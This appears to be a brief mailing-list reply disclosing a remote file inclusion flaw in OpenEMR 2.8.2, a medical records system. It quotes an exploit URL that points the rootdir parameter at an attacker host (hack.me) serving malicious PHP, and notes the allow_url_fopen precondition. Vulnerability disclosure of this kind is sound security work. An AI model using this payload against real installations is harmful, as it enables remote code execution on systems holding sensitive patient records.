Hmm, it isn't fake - i was able to exploit this bug.
This software (i mean openemr) i so badly written that i have been able
to find few other bugs,  like:
"""
Possible RCE in OpenEMR 2.8.2

Exploit:
http://example.com/openemr/interface/login/login_frame.php?rootdir=http://hack.me/

Place login/filler.php in your root of http://hack.me/ server directory
with some 
3vil PHP code.

Risk: Critical

Precautions: 
- allow_url_fopen needs to be turned on
"""
I belive it is possible to find many similar, but m train trip was
rather short.

However, this software is so badly written, that finding such bugs is
extremely low hanging fruit.
